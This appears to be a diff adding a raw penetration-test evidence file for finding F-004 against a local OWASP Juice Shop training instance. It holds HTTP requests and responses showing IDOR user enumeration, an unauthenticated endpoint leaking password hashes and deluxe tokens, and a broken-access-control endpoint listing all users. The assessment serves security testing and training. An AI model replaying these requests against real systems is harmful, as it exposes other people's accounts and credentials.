@@ -1,0 +1,134 @@
+==============================
+RAW EVIDENCE - F-004
+Broken Access Control / IDOR
+Target: http://localhost:3000
+Date: Sun Apr 12 09:48:02 UTC 2026
+==============================
+
+--- TOKENS ---
+Admin token (id=1, admin@juice-sh.op): eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXN...
+User token (id=3, bender@juice-sh.op): eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXN...
+
+==============================
+FINDING F-004-A: IDOR GET /api/Users/{id}
+==============================
+
+REQUEST:
+GET /api/Users/1 HTTP/1.1
+Host: localhost:3000
+Authorization: Bearer [USER_TOKEN for bender@juice-sh.op id=3]
+
+RESPONSE:
+{"status":"success","data":{"id":1,"username":"","email":"admin@juice-sh.op","role":"admin","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/defaultAdmin.png","isActive":true,"createdAt":"2026-04-11T20:32:02.729Z","updatedAt":"2026-04-11T20:32:02.729Z","deletedAt":null}}
+
+--- Enumerating all users 1-10 as regular user ---
+  /api/Users/1 -> admin@juice-sh.op (admin)
+  /api/Users/2 -> jim@juice-sh.op (customer)
+  /api/Users/3 -> bender@juice-sh.op (customer)
+  /api/Users/4 -> bjoern.kimminich@gmail.com (admin)
+  /api/Users/5 -> ciso@juice-sh.op (deluxe)
+  /api/Users/6 -> support@juice-sh.op (admin)
+  /api/Users/7 -> morty@juice-sh.op (customer)
+  /api/Users/8 -> mc.safesearch@juice-sh.op (customer)
+  /api/Users/9 -> J12934@juice-sh.op (admin)
+  /api/Users/10 -> wurstbrot@juice-sh.op (admin)
+
+==============================
+FINDING F-004-B: Unauthenticated /rest/memories + Password Hash Leak
+==============================
+
+REQUEST:
+GET /rest/memories HTTP/1.1
+Host: localhost:3000
+(No Authorization header)
+
+RESPONSE (truncated to first 3 entries):
+Total memories: 10
+{
+  "memory_id": 1,
+  "UserId": 13,
+  "caption": "\ud83d\ude3c #zatschi #whoneedsfourlegs",
+  "User_email": "bjoern@owasp.org",
+  "User_password_hash": "9283f1b2e9669749081963be0462e466",
+  "User_role": "deluxe",
+  "User_deluxeToken": "efe2f1599e2d93440d5243a1ffaf5a413b70cf3ac97156bd6fab9b5ddfcbe0e4"
+}
+{
+  "memory_id": 2,
+  "UserId": 4,
+  "caption": "Magn(et)ificent!",
+  "User_email": "bjoern.kimminich@gmail.com",
+  "User_password_hash": "6edd9d726cbdc873c539e41ae8757b8c",
+  "User_role": "admin",
+  "User_deluxeToken": ""
+}
+{
+  "memory_id": 3,
+  "UserId": 4,
+  "caption": "My rare collectors item! [\u0332\u0305$\u0332\u0305(\u0332\u0305 \u0361\u00b0 \u035c\u0296 \u0361\u00b0\u0332\u0305)\u0332\u0305$\u0332\u0305]",
+  "User_email": "bjoern.kimminich@gmail.com",
+  "User_password_hash": "6edd9d726cbdc873c539e41ae8757b8c",
+  "User_role": "admin",
+  "User_deluxeToken": ""
+}
+
+==============================
+FINDING F-004-C: Broken Access Control - /rest/user/authentication-details/
+==============================
+
+REQUEST (as regular user bender):
+GET /rest/user/authentication-details/ HTTP/1.1
+Host: localhost:3000
+Authorization: Bearer [USER_TOKEN for bender@juice-sh.op]
+
+RESPONSE (showing all 21 users - first 5):
+Total users returned: 21
+{
+  "id": 1,
+  "email": "admin@juice-sh.op",
+  "role": "admin",
+  "password_masked": "********************************",
+  "deluxeToken": "",
+  "lastLoginIp": ""
+}
+{
+  "id": 2,
+  "email": "jim@juice-sh.op",
+  "role": "customer",
+  "password_masked": "********************************",
+  "deluxeToken": "",
+  "lastLoginIp": ""
+}
+{
+  "id": 3,
+  "email": "bender@juice-sh.op",
+  "role": "customer",
+  "password_masked": "********************************",
+  "deluxeToken": "",
+  "lastLoginIp": ""
+}
+{
+  "id": 4,
+  "email": "bjoern.kimminich@gmail.com",
+  "role": "admin",
+  "password_masked": "********************************",
+  "deluxeToken": "",
+  "lastLoginIp": ""
+}
+{
+  "id": 5,
+  "email": "ciso@juice-sh.op",
+  "role": "deluxe",
+  "password_masked": "********************************",
+  "deluxeToken": "d715c2c75d4a42d3825a050e0a0163c1959b51165373f17bd8eed7b1e05bf20d",
+  "lastLoginIp": ""
+}
+
+==============================
+FINDING F-004-D: /api/Challenges/ Information Disclosure
+==============================
+Total challenges exposed: 111
+Sample entries:
+  Password Hash Leak (diff=2): Obtain the password (hash) of the currently logged-in user directly from a REST 
+  API-only XSS (diff=3): Perform a <i>persisted</i> XSS attack with <code>&lt;iframe src="javascript:aler
+  Access Log (diff=4): Gain access to any access log file of the server.
